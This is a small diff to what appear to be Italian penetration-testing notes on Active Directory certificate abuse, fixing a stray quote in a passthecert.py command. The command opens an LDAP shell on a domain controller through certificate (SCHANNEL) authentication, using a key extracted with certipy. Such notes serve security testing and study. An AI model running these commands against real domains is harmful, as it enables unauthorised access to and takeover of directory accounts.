@@ -276,6 +276,6 @@ python3 certipy cert -pfx cert.pfx -nocert -out user.key
 
 Ottengo una shell tramite LDAP usando SCHANNEL come meccanismo di auth:
 ```
-python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "IPDC" "
+python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "IPDC"
 ```
 
